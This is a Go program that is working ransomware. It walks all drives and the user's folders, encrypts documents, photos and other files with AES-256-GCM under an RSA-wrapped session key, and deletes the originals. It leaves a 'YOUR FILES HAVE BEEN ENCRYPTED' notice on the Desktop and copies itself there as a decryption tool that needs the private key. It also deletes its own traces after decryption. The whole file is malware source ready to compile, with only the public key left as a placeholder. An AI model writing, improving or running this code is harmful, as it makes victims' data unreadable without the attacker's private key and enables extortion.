package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

var hmacKey = []byte("integrity-verification-key-32bytes")

var systemDirs = []string{
	"windows", "program files", "program files (x86)", "system32", "syswow64",
	"programdata", "boot", "recovery", "$recycle.bin", "system volume information",
	"windows.old", "perflogs", "msocache",
}

//var systemFiles = []string{
//	".exe", ".dll", ".sys", ".tmp", ".log", ".ini", ".dat", ".msi", ".cab",
//	".drv", ".ocx", ".cpl", ".scr", ".com", ".bat", ".cmd", ".ps1", ".bin",
//}

// Hardcoded RSA Public Key - USED FOR ENCRYPTION ONLY
var rsaPublicKeyPEM = `-----BEGIN PUBLIC KEY-----
xxxxx
-----END PUBLIC KEY-----`

var rsaPublicKey *rsa.PublicKey

func init() {
	// Load the hardcoded RSA public key
	var err error
	rsaPublicKey, err = loadPublicKeyFromPEM(rsaPublicKeyPEM)
	if err != nil {
		panic("Failed to load public key: " + err.Error())
	}
}

func loadPublicKeyFromPEM(pemData string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pemData))
	if block == nil {
		return nil, fmt.Errorf("failed to decode PEM block containing public key")
	}

	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		// Try PKIX format
		pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
		if err != nil {
			return nil, err
		}
		publicKey = pubInterface.(*rsa.PublicKey)
	}

	return publicKey, nil
}

func main() {
	// Check is the decryption tool (running from Desktop)
	currentPath, _ := os.Executable()
	currentName := filepath.Base(currentPath)

	if strings.EqualFold(currentName, "DECRYPT_TOOL.exe") {
		// We are the decryption tool - requires private key
		runDecryptionTool()
		return
	}

	runEncryptionTool()
}

func runEncryptionTool() {
	// Generate a random AES key for file encryption
	aesKey := make([]byte, 32)
	_, err := io.ReadFull(rand.Reader, aesKey)
	if err != nil {
		panic("Failed to generate AES key: " + err.Error())
	}

	// Encrypt the AES key with RSA public key
	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPublicKey, aesKey, nil)
	if err != nil {
		panic("Failed to encrypt AES key: " + err.Error())
	}

	exePath, _ := os.Executable()
	exeName := filepath.Base(exePath)

	// Get desktop path for instructions and decryption tool
	desktopPath := getDesktopPath()

	// Get ALL directories on all drives (except system ones)
	dirs := getAllTargetDirectories()

	fmt.Println("Auto-encrypting files...")
	fmt.Printf("Scanning all drives...\n")
	fmt.Printf("Skipping: %s\n", exeName)

	// Create instructions file and decryption tool BEFORE encryption
	createInstructionsFile(desktopPath)
	createDecryptionTool(desktopPath, encryptedAESKey)

	count := 0
	for _, dir := range dirs {
		if _, err := os.Stat(dir); err == nil {
			fmt.Printf("Scanning: %s\n", dir)
			processed := encryptFiles(dir, exeName, aesKey)
			count += processed
			if processed > 0 {
				fmt.Printf(" Encrypted %d files in %s\n", processed, dir)
			}
		}
	}

	fmt.Printf(" Total encrypted: %d files\n", count)
	fmt.Printf(" Files created on desktop:\n")
	fmt.Printf("   - DECRYPT_INSTRUCTIONS.txt\n")
	fmt.Printf("   - DECRYPT_TOOL.exe\n")
	fmt.Printf("   - ENCRYPTED_AES_KEY.bin (encrypted session key)\n")

	fmt.Println("\nPress Enter to exit...")
	fmt.Scanln()
}

func runDecryptionTool() {
	fmt.Println("=== FILE DECRYPTION TOOL ===")
	fmt.Println("Your files have been encrypted.")
	fmt.Println("To decrypt, please provide your private key.")
	fmt.Println()

	// Load private key from user
	privateKey, err := loadPrivateKeyFromUser()
	if err != nil {
		fmt.Printf(" Failed to load private key: %v\n", err)
		fmt.Println("Decryption cannot proceed without the correct private key.")
		fmt.Println("\nPress Enter to exit...")
		fmt.Scanln()
		return
	}

	// Load encrypted AES key
	encryptedAESKey, err := loadEncryptedAESKey()
	if err != nil {
		fmt.Printf(" Failed to load encrypted AES key: %v\n", err)
		fmt.Println("\nPress Enter to exit...")
		fmt.Scanln()
		return
	}

	// Decrypt the AES key using the provided private key
	fmt.Println(" Decrypting AES session key...")
	aesKey, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, encryptedAESKey, nil)
	if err != nil {
		fmt.Printf(" Failed to decrypt AES key - wrong private key? %v\n", err)
		fmt.Println("\nPress Enter to exit...")
		fmt.Scanln()
		return
	}

	fmt.Println(" AES key successfully decrypted")
	fmt.Println(" Decrypting files...")

	// Get all directories to decrypt
	dirs := getAllTargetDirectories()
	decrypted := 0

	for _, dir := range dirs {
		if _, err := os.Stat(dir); err == nil {
			processed := decryptFiles(dir, "DECRYPT_TOOL.exe", aesKey)
			decrypted += processed
			if processed > 0 {
				fmt.Printf(" Decrypted %d files in %s\n", processed, dir)
			}
		}
	}

	if decrypted > 0 {
		fmt.Printf(" Successfully decrypted %d files!\n", decrypted)

		// AUTO-CLEANUP: Remove all created files without asking
		cleanupFiles()

	} else {
		fmt.Println(" No files were decrypted. Possible reasons:")
		fmt.Println("   - No encrypted files found")
		fmt.Println("   - Files were already decrypted")
		fmt.Println("   - Wrong private key provided")
	}

	fmt.Println("\nPress Enter to exit...")
	fmt.Scanln()
}

func loadPrivateKeyFromUser() (*rsa.PrivateKey, error) {
	fmt.Println("Please choose how to provide your private key:")
	fmt.Println("1. Load from file (private.key)")
	fmt.Println("2. Paste PEM content")
	fmt.Print("Choose option (1 or 2): ")

	var choice string
	fmt.Scanln(&choice)

	switch choice {
	case "1":
		return loadPrivateKeyFromFile("private.key")
	case "2":
		return loadPrivateKeyFromStdin()
	default:
		return nil, fmt.Errorf("invalid choice")
	}
}

func loadPrivateKeyFromFile(filename string) (*rsa.PrivateKey, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	return parsePrivateKey(data)
}

func loadPrivateKeyFromStdin() (*rsa.PrivateKey, error) {
	fmt.Println("Please paste your private key (PEM format):")
	fmt.Println("(Press Enter then Ctrl+Z and Enter to finish on Windows)")

	data, err := io.ReadAll(os.Stdin)
	if err != nil {
		return nil, err
	}

	return parsePrivateKey(data)
}

func parsePrivateKey(data []byte) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode(data)
	if block == nil {
		return nil, fmt.Errorf("failed to decode PEM block containing private key")
	}

	// Try PKCS1
	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err == nil {
		return privateKey, nil
	}

	// Try PKCS8
	key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	rsaKey, ok := key.(*rsa.PrivateKey)
	if !ok {
		return nil, fmt.Errorf("not an RSA private key")
	}

	return rsaKey, nil
}

func loadEncryptedAESKey() ([]byte, error) {
	desktopPath := getDesktopPath()
	keyPath := filepath.Join(desktopPath, "ENCRYPTED_AES_KEY.bin")

	data, err := os.ReadFile(keyPath)
	if err != nil {
		return nil, err
	}

	return data, nil
}

func createInstructionsFile(desktopPath string) {
	instructions := ` YOUR FILES HAVE BEEN ENCRYPTED

To decrypt your files:
1. You need your PRIVATE KEY to decrypt
2. Run DECRYPT_TOOL.exe from your Desktop
3. When prompted, provide your private key:
   - Option 1: Place 'private.key' file in the same directory
   - Option 2: Paste the private key when prompted
4. Wait for the decryption to complete

IMPORTANT:
- Without the correct private key, decryption is IMPOSSIBLE
- After decryption, ALL tool files will be automatically deleted
- Your original files will be restored
- No traces will be left behind

Encryption Method: 
- AES-256-GCM for file encryption
- RSA-2048-OAEP for key encryption
- HMAC-SHA256 for integrity verification

All file types have been encrypted: documents, photos, videos, etc.

=== SECURITY NOTICE ===
Only the holder of the private key can decrypt the files.
Keep your private key secure and do not share it.
`

	instructionsPath := filepath.Join(desktopPath, "DECRYPT_INSTRUCTIONS.txt")
	err := os.WriteFile(instructionsPath, []byte(instructions), 0644)
	if err != nil {
		fmt.Printf("Warning: Could not create instructions file: %v\n", err)
	} else {
		fmt.Printf(" Instructions file created: %s\n", instructionsPath)
	}
}

func createDecryptionTool(desktopPath string, encryptedAESKey []byte) {
	// Copy current executable to desktop as decryption tool
	currentExe, _ := os.Executable()
	decryptToolPath := filepath.Join(desktopPath, "DECRYPT_TOOL.exe")

	// Read current executable
	data, err := os.ReadFile(currentExe)
	if err != nil {
		fmt.Printf("Error reading executable: %v\n", err)
		return
	}

	// Write to desktop
	err = os.WriteFile(decryptToolPath, data, 0755)
	if err != nil {
		fmt.Printf("Error creating decryption tool: %v\n", err)
	} else {
		fmt.Printf(" Decryption tool created: %s\n", decryptToolPath)
	}

	// Save encrypted AES key
	keyPath := filepath.Join(desktopPath, "ENCRYPTED_AES_KEY.bin")
	err = os.WriteFile(keyPath, encryptedAESKey, 0644)
	if err != nil {
		fmt.Printf("Error saving encrypted AES key: %v\n", err)
	} else {
		fmt.Printf(" Encrypted AES key saved: %s\n", keyPath)
	}
}

func cleanupFiles() {
	desktopPath := getDesktopPath()

	// Files to remove
	filesToRemove := []string{
		filepath.Join(desktopPath, "DECRYPT_INSTRUCTIONS.txt"),
		filepath.Join(desktopPath, "DECRYPT_TOOL.exe"),
		filepath.Join(desktopPath, "ENCRYPTED_AES_KEY.bin"),
	}

	// Also try to find and remove the original encryption tool
	originalEncryptor := findOriginalEncryptor()
	if originalEncryptor != "" {
		filesToRemove = append(filesToRemove, originalEncryptor)
	}

	fmt.Println(" Cleaning up files...")

	removedCount := 0
	for _, file := range filesToRemove {
		if _, err := os.Stat(file); err == nil {
			err := os.Remove(file)
			if err == nil {
				fmt.Printf(" Removed: %s\n", filepath.Base(file))
				removedCount++
			} else {
				fmt.Printf(" Could not remove: %s\n", filepath.Base(file))
			}
		}
	}

	fmt.Printf("Cleanup completed. Removed %d files.\n", removedCount)
}

func findOriginalEncryptor() string {
	// Try to find the original encryption tool in common locations
	currentExe, _ := os.Executable()
	currentDir := filepath.Dir(currentExe)

	// If we're running from Desktop, look for the original in other locations
	if strings.Contains(strings.ToLower(currentDir), "desktop") {
		// Check common download locations
		downloads := filepath.Join(os.Getenv("USERPROFILE"), "Downloads")
		possibleLocations := []string{
			downloads,
			"C:\\",
			"D:\\",
			filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		}

		possibleNames := []string{
			"filelocker.exe",
			"encryptor.exe",
			"tool.exe",
		}

		for _, location := range possibleLocations {
			for _, name := range possibleNames {
				fullPath := filepath.Join(location, name)
				if _, err := os.Stat(fullPath); err == nil {
					return fullPath
				}
			}
		}
	}

	return ""
}

func getDesktopPath() string {
	profile := os.Getenv("USERPROFILE")
	if profile == "" {
		profile = "C:\\Users\\" + os.Getenv("USERNAME")
	}
	return filepath.Join(profile, "Desktop")
}

func getAllTargetDirectories() []string {
	profile := os.Getenv("USERPROFILE")
	if profile == "" {
		profile = "C:\\Users\\" + os.Getenv("USERNAME")
	}

	// Get all available drives
	drives := getAvailableDrives()
	allDirs := []string{}

	// Add root of all drives (will filter system files in shouldSkip)
	for _, drive := range drives {
		allDirs = append(allDirs, drive+"\\")
	}

	// Add user directories
	userDirs := []string{
		profile,
		filepath.Join(profile, "Documents"),
		filepath.Join(profile, "Desktop"),
		filepath.Join(profile, "Downloads"),
		filepath.Join(profile, "Pictures"),
		filepath.Join(profile, "Music"),
		filepath.Join(profile, "Videos"),
		filepath.Join(profile, "OneDrive"),
	}

	allDirs = append(allDirs, userDirs...)

	return allDirs
}

func getAvailableDrives() []string {
	var drives []string
	for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
		drivePath := string(drive) + ":"
		if _, err := os.Stat(drivePath + "\\"); err == nil {
			drives = append(drives, drivePath)
		}
	}
	return drives
}

func encryptFiles(dir string, skipExe string, key []byte) int {
	block, err := aes.NewCipher(key)
	if err != nil {
		return 0
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return 0
	}

	count := 0
	err = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Skip files with errors
		}

		if info.IsDir() {
			// Skip system directories
			dirName := strings.ToLower(filepath.Base(path))
			for _, sysDir := range systemDirs {
				if dirName == sysDir {
					return filepath.SkipDir
				}
			}
			return nil
		}

		if shouldSkip(path, skipExe, info) {
			return nil
		}

		if encryptFile(path, gcm) {
			count++
		}
		return nil
	})

	if err != nil {
		fmt.Printf("Walk error in %s: %v\n", dir, err)
	}

	return count
}

func shouldSkip(path string, skipExe string, info os.FileInfo) bool {
	name := filepath.Base(path)
	fullPath := strings.ToLower(path)

	// Skip the executable itself
	if strings.EqualFold(name, skipExe) {
		return true
	}

	// Skip instructions file and decryption tool
	if strings.EqualFold(name, "DECRYPT_INSTRUCTIONS.txt") ||
		strings.EqualFold(name, "DECRYPT_TOOL.exe") ||
		strings.EqualFold(name, "ENCRYPTED_AES_KEY.bin") {
		return true
	}

	// Skip system directories
	dirName := strings.ToLower(filepath.Base(filepath.Dir(path)))
	for _, sysDir := range systemDirs {
		if dirName == sysDir || strings.Contains(fullPath, "\\"+sysDir+"\\") {
			return true
		}
	}

	// Skip ONLY critical system file extensions, allow .txt, .docx, .jpg, etc.
	criticalSystemFiles := []string{".exe", ".dll", ".sys", ".msi", ".cab", ".drv", ".cpl", ".scr"}
	ext := strings.ToLower(filepath.Ext(path))
	for _, sysExt := range criticalSystemFiles {
		if ext == sysExt {
			return true
		}
	}

	return false
}

func encryptFile(path string, gcm cipher.AEAD) bool {
	// Skip if already encrypted
	if filepath.Ext(path) == ".enc" {
		return false
	}

	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Printf("Error reading %s: %v\n", path, err)
		return false
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		fmt.Printf("Error generating nonce for %s: %v\n", path, err)
		return false
	}

	encrypted := gcm.Seal(nonce, nonce, data, nil)

	// Add HMAC
	mac := hmac.New(sha256.New, hmacKey)
	mac.Write(encrypted)
	hash := mac.Sum(nil)

	protected := append(encrypted, hash...)

	// Write encrypted file
	err = os.WriteFile(path+".enc", protected, 0666)
	if err != nil {
		fmt.Printf("Error writing encrypted file %s: %v\n", path+".enc", err)
		return false
	}

	// Remove original
	err = os.Remove(path)
	if err != nil {
		fmt.Printf("Error removing original %s: %v\n", path, err)
		return false
	}

	return true
}

func decryptFiles(dir string, skipExe string, key []byte) int {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(" AES cipher error - wrong key?")
		return 0
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println(" GCM error - wrong key?")
		return 0
	}

	count := 0
	err = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if info.IsDir() {
			return nil
		}

		if shouldSkip(path, skipExe, info) || filepath.Ext(path) != ".enc" {
			return nil
		}

		if decryptFile(path, gcm) {
			count++
		}
		return nil
	})

	if err != nil {
		fmt.Printf("Walk error in %s: %v\n", dir, err)
	}

	return count
}

func decryptFile(path string, gcm cipher.AEAD) bool {
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}

	if len(data) < 32 {
		return false
	}

	// Verify HMAC
	encrypted := data[:len(data)-32]
	expectedHash := data[len(data)-32:]

	mac := hmac.New(sha256.New, hmacKey)
	mac.Write(encrypted)
	if !hmac.Equal(expectedHash, mac.Sum(nil)) {
		fmt.Println(" File corrupted:", path)
		return false
	}

	if len(encrypted) < gcm.NonceSize() {
		return false
	}

	// Decrypt
	nonce := encrypted[:gcm.NonceSize()]
	ciphertext := encrypted[gcm.NonceSize():]
	original, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Printf(" Decrypt failed for %s: %v\n", path, err)
		return false
	}

	// Write decrypted file
	output := path[:len(path)-4]
	err = os.WriteFile(output, original, 0666)
	if err != nil {
		return false
	}

	// Remove encrypted file
	os.Remove(path)
	return true
}
